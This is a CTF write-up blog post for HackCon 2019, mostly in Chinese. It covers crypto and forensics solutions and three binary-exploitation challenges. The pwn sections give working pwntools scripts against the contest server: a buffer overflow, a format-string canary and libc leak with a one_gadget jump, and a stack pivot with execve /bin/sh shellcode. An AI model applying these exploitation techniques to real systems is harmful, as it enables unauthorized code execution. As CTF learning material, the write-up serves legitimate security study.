---
layout: post
title:  "HackCon 2019-Writeup"
date:   2019-8-23
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

#  HackCon 2019-Writeup

* ### Small icon much wow

  binwalk看一下然后dd分离得到二维码

* ### OTP

  两个密文异或之后得到两个明文异或的结果，根据明文里有"meme"分析

  ```
  c1 = '054617121418010c0b34'
  c2 = '3e1f00140a0807510a0e'
  
  c = '054617121418010c0b343e1f00140a0807510a0e'
  
  
  xor_res = '3b5917061e10065d013a'.decode('hex')
  
  meme = '6d656d65'.decode('hex')
  
  for i in range(7):
  	fuck = ''
  	for j in range(len(xor_res[i:i+4])):
  		fuck += hex(ord(xor_res[i:i+4][j])^ord(meme[j]))[2:].zfill(0)
  	print(fuck.decode('hex'))
  
  
  def xor(a,b):
      assert len(a)==len(b)
      c=""
      for i in range(len(a)):
          c+=chr(ord(a[i])^ord(b[i]))
      return c
  p1 = 'd4rk{meme_'
  print(xor(c1.decode('hex'),p1))
  key = 'areyoudank'
  
  print(xor(key,c1.decode('hex')))
  
  print(xor(key,c2.decode('hex')))
  #d4rk{meme__meme}c0de
  ```

* Noki

  ```
   g4iu{ocs_oaeiiamqqi_qk_moam!}e0gi
  ```

  维吉尼亚密码，密钥长度与明文长度相同

  根据d4rk看一波发现密钥和明文相同，然后就是他填字游戏了

  

* ### baby b0f

  改栈上的参数

  ```
  from pwn import *
  r = remote('68.183.158.95',8989)
  payload = 'a'*(0xe-4)+p64(0xDEADBEEF)
  r.sendline(payload)
  r.interactive()
  ```

* ### Not So Easy B0f

  格式化字符串泄露canary和main地址

  main地址不变，由于长度限制，再跑一次泄露libcstartmain+231，计算libc基址

  然后跳one_gadget

  ```python
  from pwn import *
  r = remote('68.183.158.95',8991)
  #r = process('./q3')
  elf = ELF('./q3')
  libc = ELF('./libc.so.6')
  
  #%17$llx 400796
  payload = '%11$llx%13$llx'
  r.sendline(payload)
  r.recvuntil('Hello\n')
  fuck = r.recvline().strip()
  print(fuck)
  canary = fuck[0:16]
  lsm = fuck[16:]
  main = '400796'
  log.success(canary)
  log.success(main)
  canary = int(canary,16)
  main = int(main,16)
  lsm = int(lsm,16)-231
  start = main-0x77a
  log.success('canary:'+hex(canary))
  log.success('start:'+hex(start))
  
  log.success('libc_start_main:'+hex(lsm))
  
  puts_plt = start+0x620
  puts_got = start + elf.got['puts']
  puts_libc = libc.symbols['puts']
  
  lsm_libc = libc.symbols['__libc_start_main']
  libc_base = lsm - lsm_libc
  p_rdi = start + 0x893
  one = libc_base + 0x45216
  payload = 'a'*(0x20-0x8)+p64(canary)+'fuckfuck'+p64(one)
  #payload += p64(p_rdi)+p64(puts_got)+p64(puts_plt)
  #payload += p64(main)
  r.sendline(payload)
  #r.recvuntil('Enter sentence :')
  #log.info(hex(u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))))
  r.interactive()
  ```

* ### 2 small 2 Pwn

  覆盖rbp，栈迁移，然后往data段写shellcode再跳过去

  ```python
  from pwn import *
  r = remote('68.183.158.95',8992)
  context(os='linux', arch='amd64')
  main = 0x4000c7
  payload = 'a'*0x10+p64(0x6000ec+0x10) + p64(main)
  r.sendline(payload)
  sh = asm("""
  mov eax, 59
  mov rdi, 0x60010c
  xor rsi, rsi
  xor rdx,rdx
  syscall
  """)
  payload = sh.ljust(0x18,'\x00')+p64(0x6000EC)+"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x00"
  r.sendline(payload)
  
  r.interactive()
  
  
  ```

  

